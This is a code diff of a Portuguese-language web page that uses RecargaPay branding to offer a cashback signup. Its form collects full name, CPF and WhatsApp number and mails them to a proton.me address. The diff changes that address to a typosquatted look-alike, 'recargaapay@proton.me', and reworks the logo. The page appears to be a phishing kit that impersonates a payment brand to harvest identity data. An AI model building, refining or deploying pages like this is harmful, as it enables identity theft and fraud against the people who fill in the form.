@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -9,34 +8,20 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to bottom, #ffffff, #e6f2ff);
+      background-color: #e6f2ff;
       color: #222;
     }
     header {
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 15px 0;
+      padding: 30px 0;
       background: white;
       box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
-    .logo {
-      display: flex;
-      align-items: center;
-      font-weight: bold;
-      font-size: 1.5rem;
-      color: #333;
-    }
-    .logo img {
-      height: 40px;
-      margin-right: 10px;
-    }
-    .logo-text {
-      color: #004aad;
-      font-size: 22px;
-    }
-    .highlight {
-      color: #ff9900;
+    .logo-img {
+      width: 250px;
+      max-width: 80%;
     }
     .container {
       max-width: 600px;
@@ -86,10 +71,7 @@
 </head>
 <body>
   <header>
-    <div class="logo">
-      <img src="logo.png" alt="Logo RecargaPay">
-      <div class="logo-text">Recarga<span class="highlight">Pay</span></div>
-    </div>
+    <img src="logo.png" alt="Logo RecargaPay" class="logo-img">
   </header>
 
   <div class="container">
@@ -102,7 +84,7 @@
 
     <div id="cadastro">
       <h1>Cadastro para Cashback</h1>
-      <form action="mailto:recargapay@proton.me" method="post" enctype="text/plain">
+      <form action="mailto:recargaapay@proton.me" method="post" enctype="text/plain">
         <input type="text" name="Nome" placeholder="Nome completo" required><br>
         <input type="text" name="CPF" placeholder="CPF" required><br>
         <input type="text" name="WhatsApp" placeholder="WhatsApp" required><br>
